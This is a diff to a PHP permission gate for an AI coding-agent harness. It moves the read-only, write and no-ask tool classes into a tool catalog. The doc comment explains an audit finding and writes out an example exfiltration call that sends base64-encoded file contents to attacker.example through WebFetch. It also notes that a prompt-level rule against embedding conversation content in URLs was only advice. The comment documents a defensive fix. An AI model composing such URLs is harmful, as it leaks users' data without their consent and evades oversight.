@@ -5,6 +5,8 @@ declare(strict_types=1);
 namespace SugarCraft\Crush\Permissions;
 
 use SugarCraft\Crush\ToolCall;
+use SugarCraft\Crush\Tools\Catalog\ToolCatalog;
+use SugarCraft\Crush\Tools\Catalog\ToolPermissionClass;
 
 /**
  * PermissionGate evaluates every ToolCall against the active PermissionMode
@@ -403,6 +405,14 @@ final class PermissionGate
         bool $argumentsKnown,
         ?string $projectRoot,
     ): PermissionDecision {
+        // A no-ask tool writes only harness-owned state (the memory
+        // directories), so every mode lets it run: a prompt would protect
+        // nothing, and before the TUI can answer an Ask it would be a deny.
+        // Rules were already consulted in decide(), so a Deny rule still wins.
+        if ($this->isNoAskTool($call)) {
+            return PermissionDecision::Allow;
+        }
+
         return match ($this->mode) {
             PermissionMode::Default => $this->evaluateDefault($call),
             PermissionMode::AcceptEdits => $this->evaluateAcceptEdits($call, $projectRoot),
@@ -971,69 +981,60 @@ final class PermissionGate
     // -------------------------------------------------------------------------
 
     /**
-     * The built-in tools this gate treats as read-only: `Read`, `Grep`, `Glob`,
-     * `Lsp`. `Find` was never a real tool name.
+     * The built-in tools this gate treats as read-only: those whose
+     * `#[BuiltInTool]` declaration says {@see ToolPermissionClass::Read}
+     * (today `Read`, `Grep`, `Glob`, `Lsp`), read from {@see ToolCatalog}.
      *
-     * A DECISION, NOT A CENSUS OF `src/Tools/BuiltIn/`, and the earlier wording
-     * here ("Read-only built-in tools (@see src/Tools/BuiltIn/): …") claimed to be
-     * the latter — a list whose stated domain was a directory, while three tools
-     * in that directory that mutate nothing were absent from it. `WebSearch`,
-     * `Skill` and `doctor` are deliberately still absent: each reaches something
-     * outside this process (a search endpoint, a skill body that may carry
-     * `allowed-tools`, a capability probe), so leaving them to Ask costs a prompt
-     * while listing them would spend a judgement this class cannot make.
+     * A DECISION, NOT A CENSUS: the class is declared per tool, and "read-only"
+     * here means "safe to run unasked". `WebSearch`, `Skill` and `doctor`
+     * declare {@see ToolPermissionClass::Ask}: each reaches something outside
+     * this process (a search endpoint, a skill body that may carry
+     * `allowed-tools`, a capability probe), so leaving them to Ask costs a
+     * prompt while calling them reads would spend a judgement this class
+     * cannot make.
      *
-     * `WebFetch` LEFT THIS LIST in audit F-P6, for the strongest form of that
-     * same reason. It writes nothing locally, but "read-only" here means "safe
-     * to run unasked", and a fetch is an outbound request whose URL the model
-     * composes: `WebFetch https://attacker.example/?d=<base64 of what Read just
-     * returned>` sent data out unprompted under `default`, `plan` and even
-     * `dont-ask` (documented as "Deny writes / everything else"). The tool
-     * description's "never construct a URL that embeds conversation content"
-     * is advice to the model, not enforcement. It now Asks under `default`,
-     * `accept-edits` and `plan` and is denied under `dont-ask`; a
-     * `WebFetch(domain:…)` allow rule re-grants the hosts a user trusts.
+     * `WebFetch` LEFT the read-only class in audit F-P6. It writes nothing
+     * locally, but a fetch is an outbound request whose URL the model composes:
+     * `WebFetch https://attacker.example/?d=<base64 of what Read just
+     * returned>` sent data out unprompted under `default`, `plan` and
+     * `dont-ask`. It now Asks under `default`, `accept-edits` and `plan` and is
+     * denied under `dont-ask`; a `WebFetch(domain:…)` allow rule re-grants the
+     * hosts a user trusts.
      *
-     * `Lsp` IS here, and the reason is specific to it rather than inherited: its
-     * whole `operation` domain is queries — definition, references, hover,
-     * symbols, codeActions, diagnostics — and the mutating half of LSP (rename,
-     * formatting, APPLYING a code action's edit) is absent from that tool by
-     * construction. `codeActions` RETURNS proposed edits and nothing applies one;
-     * an edit still has to come back through `Edit`/`Write`, which are
-     * {@see isWriteTool()}. Without this entry, Plan mode — the mode whose entire
-     * purpose is reading a codebase before touching it — asked before every
-     * go-to-definition, and DontAsk denied it outright.
+     * `Lsp` IS read-only because its whole `operation` domain is queries; the
+     * mutating half of LSP (rename, formatting, applying a code action's edit)
+     * is absent from that tool by construction, and an edit still has to come
+     * back through `Edit`/`Write`.
      */
     private function isReadOnlyTool(ToolCall $call): bool
     {
-        return in_array($call->name, ['Read', 'Grep', 'Glob', 'Lsp'], true);
+        return in_array($call->name, ToolCatalog::namesOf(ToolPermissionClass::Read), true);
     }
 
     /**
-     * Write-capable tools: `Edit`/`Write` mutate files directly, `Bash` can do
-     * anything a shell can, `Task` delegates to a sub-agent whose own tools can
-     * do the same behind this process (crush_code.md P8.13 — the judgement is
-     * `Bash`'s: the tool writes nothing itself and everything through what it
-     * launches), and MCP tools follow the `mcp__<server>__<tool>`
-     * naming convention (@see PermissionRule) — their capability is
-     * server-defined and unknowable here, so they're treated conservatively as
-     * writes. `McpTool` was never a real tool name.
-     *
-     * `Write` is named even though nothing dispatched under that name for most
-     * of this lib's life, because the cost of the two mistakes is not
-     * symmetric: a name listed here that no tool ever uses costs one dead
-     * `in_array` entry, while a real write tool missing from the list falls
-     * through to Ask in Plan mode instead of the Deny that mode promises.
-     * {@see \SugarCraft\Crush\Hooks\BuiltIn\ProtectFilesHook} has always
-     * matched on `^(Bash|Edit|Write|Read)$` for the same reason.
+     * Write-capable tools: those declaring {@see ToolPermissionClass::Write}
+     * (`Bash`, `Edit`, `Write`, `Task` — `Task` because the sub-agent it
+     * delegates to can do whatever its own tools can, crush_code.md P8.13), and
+     * MCP tools, which follow the `mcp__<server>__<tool>` naming convention
+     * (@see PermissionRule): their capability is server-defined and unknowable
+     * here, so they are treated conservatively as writes.
      */
     private function isWriteTool(ToolCall $call): bool
     {
-        if (in_array($call->name, ['Bash', 'Edit', 'Write', 'Task'], true)) {
+        if (in_array($call->name, ToolCatalog::namesOf(ToolPermissionClass::Write), true)) {
             return true;
         }
 
         return str_starts_with($call->name, 'mcp__');
+    }
+
+    /**
+     * Tools declaring {@see ToolPermissionClass::NoAsk}: they write only
+     * harness-owned state, so {@see evaluateMode()} allows them in every mode.
+     */
+    private function isNoAskTool(ToolCall $call): bool
+    {
+        return in_array($call->name, ToolCatalog::namesOf(ToolPermissionClass::NoAsk), true);
     }
 
     /**
